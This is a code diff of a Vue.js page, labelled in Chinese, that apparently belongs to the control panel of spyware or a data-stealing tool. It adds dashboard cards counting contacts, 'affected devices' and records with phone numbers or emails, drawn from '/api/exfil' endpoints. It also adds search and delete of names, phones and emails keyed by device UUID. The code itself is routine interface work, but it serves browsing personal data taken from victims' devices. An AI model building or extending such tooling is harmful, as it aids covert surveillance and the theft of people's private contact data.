@@ -1,17 +1,76 @@
 <template>
   <div class="contacts">
+    <!-- 统计卡片 -->
+    <el-row :gutter="15" class="stats-row">
+      <el-col :span="6">
+        <el-card shadow="hover">
+          <div class="stat-card">
+            <div class="stat-icon" style="background: #409eff;">
+              <el-icon size="28"><User /></el-icon>
+            </div>
+            <div class="stat-info">
+              <div class="stat-value">{{ stats.by_category?.contacts || 0 }}</div>
+              <div class="stat-label">联系人总数</div>
+            </div>
+          </div>
+        </el-card>
+      </el-col>
+      <el-col :span="6">
+        <el-card shadow="hover">
+          <div class="stat-card">
+            <div class="stat-icon" style="background: #e6a23c;">
+              <el-icon size="28"><Iphone /></el-icon>
+            </div>
+            <div class="stat-info">
+              <div class="stat-value">{{ stats.devices || 0 }}</div>
+              <div class="stat-label">受影响设备</div>
+            </div>
+          </div>
+        </el-card>
+      </el-col>
+      <el-col :span="6">
+        <el-card shadow="hover">
+          <div class="stat-card">
+            <div class="stat-icon" style="background: #67c23a;">
+              <el-icon size="28"><Phone /></el-icon>
+            </div>
+            <div class="stat-info">
+              <div class="stat-value">{{ phoneCount }}</div>
+              <div class="stat-label">含电话记录</div>
+            </div>
+          </div>
+        </el-card>
+      </el-col>
+      <el-col :span="6">
+        <el-card shadow="hover">
+          <div class="stat-card">
+            <div class="stat-icon" style="background: #f56c6c;">
+              <el-icon size="28"><Message /></el-icon>
+            </div>
+            <div class="stat-info">
+              <div class="stat-value">{{ emailCount }}</div>
+              <div class="stat-label">含邮箱记录</div>
+            </div>
+          </div>
+        </el-card>
+      </el-col>
+    </el-row>
+
+    <!-- 操作工具栏 -->
     <el-card>
-      <div class="search-bar">
-        <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
-        <el-input v-model="filters.name" placeholder="姓名" style="width: 150px;" />
-        <el-input v-model="filters.phone" placeholder="电话" style="width: 150px;" />
-        <el-button type="primary" @click="loadContacts">查询</el-button>
-        <el-button @click="resetFilters">重置</el-button>
+      <div class="toolbar">
+        <div class="search-bar">
+          <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
+          <el-input v-model="filters.name" placeholder="姓名" style="width: 150px;" />
+          <el-input v-model="filters.phone" placeholder="电话" style="width: 150px;" />
+          <el-button type="primary" @click="loadContacts">查询</el-button>
+          <el-button @click="resetFilters">重置</el-button>
+        </div>
       </div>
       
       <el-table :data="contactsData" border v-loading="loading">
         <el-table-column prop="id" label="ID" width="80" />
-        <el-table-column prop="device_uuid" label="设备UUID" width="250" />
+        <el-table-column prop="device_uuid" label="设备UUID" width="250" show-overflow-tooltip />
         <el-table-column prop="name" label="姓名" />
         <el-table-column prop="phone" label="电话" />
         <el-table-column prop="email" label="邮箱" />
@@ -38,11 +97,13 @@
 </template>
 
 <script setup>
-import { ref, reactive } from 'vue'
+import { ref, reactive, onMounted, computed } from 'vue'
 import axios from '../utils/axios'
+import { User, Iphone, Phone, Message } from '@element-plus/icons-vue'
 
 const contactsData = ref([])
 const loading = ref(false)
+const stats = ref({})
 
 const filters = reactive({
   device_uuid: '',
@@ -55,6 +116,18 @@ const pagination = reactive({
   size: 20,
   total: 0
 })
+
+const phoneCount = computed(() => contactsData.value.filter(item => item.phone).length)
+const emailCount = computed(() => contactsData.value.filter(item => item.email).length)
+
+async function loadStats() {
+  try {
+    const response = await axios.get('/api/exfil/stats')
+    stats.value = response.data
+  } catch (error) {
+    console.error('加载统计失败:', error)
+  }
+}
 
 async function loadContacts() {
   loading.value = true
@@ -80,6 +153,7 @@ async function deleteItem(id) {
   try {
     await axios.delete(`/api/exfil/${id}`)
     loadContacts()
+    loadStats()
   } catch (error) {
     console.error('删除失败:', error)
   }
@@ -103,14 +177,56 @@ function handleCurrentChange(page) {
   loadContacts()
 }
 
-loadContacts()
+onMounted(() => {
+  loadStats()
+  loadContacts()
+})
 </script>
 
 <style scoped>
+.stats-row {
+  margin-bottom: 15px;
+}
+
+.stat-card {
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.stat-icon {
+  width: 60px;
+  height: 60px;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+}
+
+.stat-info {
+  flex: 1;
+}
+
+.stat-value {
+  font-size: 24px;
+  font-weight: bold;
+  color: #333;
+}
+
+.stat-label {
+  font-size: 14px;
+  color: #999;
+  margin-top: 5px;
+}
+
+.toolbar {
+  margin-bottom: 15px;
+}
+
 .search-bar {
   display: flex;
   gap: 10px;
-  margin-bottom: 20px;
   flex-wrap: wrap;
 }
 </style>
